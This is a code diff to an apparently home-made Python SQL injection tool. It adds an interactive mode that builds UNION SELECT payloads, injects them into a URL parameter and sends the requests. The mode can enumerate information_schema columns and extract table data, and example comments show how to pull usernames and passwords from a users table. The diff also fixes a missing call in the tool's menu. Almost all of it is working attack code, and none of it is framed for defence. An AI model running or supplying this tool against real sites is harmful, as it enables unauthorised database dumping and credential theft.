@@ -47,11 +47,12 @@ def column_counter():
                     new_url = urlunparse(parse._replace(query=new_query))
                     print(f"[{i}] tessting: {new_query}")
                     res = session.get(new_url)
-                    result_ord[new_query] = len(res.text)
+                    # result_ord[new_query] = len(res.text)
                     print(f"status code: {res.status_code}")
+                    print(len(res.text))
                 # print(result_ord)
-                all_len = list(result_ord.values())
-                print(all_len)
+                # all_len = list(result_ord.values())
+                # print(all_len)
 
                 result_null = {}
                 print(f"\ntessting by NULL ({comment}):\n")
@@ -68,11 +69,12 @@ def column_counter():
                     new_url = urlunparse(parse._replace(query=new_query))
                     print(f"[{i}] testing: {new_query}")
                     res = requests.get(new_url)
-                    result_null[new_query] = len(res.text)
+                    # result_null[new_query] = len(res.text)
                     print(f"status: {res.status_code}")
+                    print(len(res.text))
                 # print(result_null)
-                all_len = list(result_null.values())
-                print(all_len)
+                # all_len = list(result_null.values())
+                # print(all_len)
     else:
         pass
 
@@ -198,6 +200,94 @@ def version():
                 print(e)
 
 
+def db_info_interactive():
+    col_count = int(input(" Enter the number of columns in the query: "))
+    quote_need = int(input(" Does the payload need quotes? 1(yes) / 0(no): "))
+
+    mode = input(" What do you want to do?\n 1 : Custom manual payload\n 2 : List columns in a table\n 3 : Extract data from a table\n >>> ").strip()
+
+# ex: ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_abcdef'--
+# ex: ' UNION SELECT username_abcdef, password_abcdef FROM users_abcdef--
+    col = ["NULL"] * col_count
+    from_clause = ""
+    where_clause = ""
+
+    if mode == "2":
+        # Mode 1: List columns from a table
+        table = input(" 🔎 Enter table name (e.g. users): ").strip()
+        while True:
+            try:
+                index = int(input(f" Column index (1–{col_count}) to put column_name in: "))
+                if 1 <= index <= col_count:
+                    break
+            except:
+                continue
+        col[index - 1] = "column_name"
+        from_clause = " FROM information_schema.columns"
+        where_clause = f" WHERE table_name='{table}'"
+
+    elif mode == "3":
+        # Mode 2: Extract data from table
+        table = input("  Enter table name (e.g. users): ").strip()
+        for i in range(col_count):
+            value = input(f" Column {i+1} name (or leave blank for NULL): ").strip()
+            if value:
+                col[i] = value
+        from_clause = f" FROM {table}"
+
+    elif mode == "1":
+        # Fully custom like before
+        while True:
+            try:
+                num_fields = int(input(" How many columns do you want to insert data into? "))
+                if 1 <= num_fields <= col_count:
+                    break
+            except:
+                continue
+
+        for _ in range(num_fields):
+            while True:
+                try:
+                    index = int(input(f" Column index (1–{col_count}): "))
+                    if 1 <= index <= col_count:
+                        break
+                except:
+                    continue
+            value = input(f" What do you want in column {index}? (e.g. column_name, version(), 'abc', table_name): ")
+            col[index - 1] = value
+
+        add_from = input(" Do you want to add a FROM clause? (y/n): ").lower()
+        if add_from == 'y':
+            from_clause = " FROM " + input("  Enter table name (ex: information_schema.tables): ").strip()
+
+    else:
+        print(" Invalid mode selected.")
+        return
+
+    # نهایی‌سازی payload
+    payload_raw = f"SELECT {','.join(col)}{from_clause}{where_clause}"
+    if quote_need:
+        payload = f"' UNION {payload_raw}--"
+    else:
+        payload = f"UNION {payload_raw}--"
+
+    test_params = query_params.copy()
+    test_params[edit_param] = [payload]
+    new_query = urlencode(test_params, doseq=True)
+    new_url = urlunparse(parse._replace(query=new_query))
+
+    print(f"\n Payload: {payload}\n")
+    print(f"Testing : {payload}\n {new_query}")
+    try:
+        res = session.get(new_url)
+        print("\n[!] status code : ", res.status_code, "\n")
+        print(" Response length:", len(res.text))
+        # print(" Response:\n", res.text[:1000], "\n...")
+    except Exception as e:
+        print(" Error:", e)
+
+
+
 while True:
     try:
         command = int(input("""enter command:
@@ -205,6 +295,8 @@ while True:
             2 : Find Version
             3 : Column Tester (with -- and # and ')
             4 : Data-type Tester
+            5 : Data Base Tables Information (non Oracle)
+            6 : Data Base Tables Information (Oracle : soon)
             0 : Exit
             >>>"""))
 
@@ -216,7 +308,9 @@ while True:
             case 3:
                 column_counter()
             case 4:
-                datatype_tester
+                datatype_tester()
+            case 5:
+                db_info_interactive()
             case 0:
                 break 
     except Exception as e:
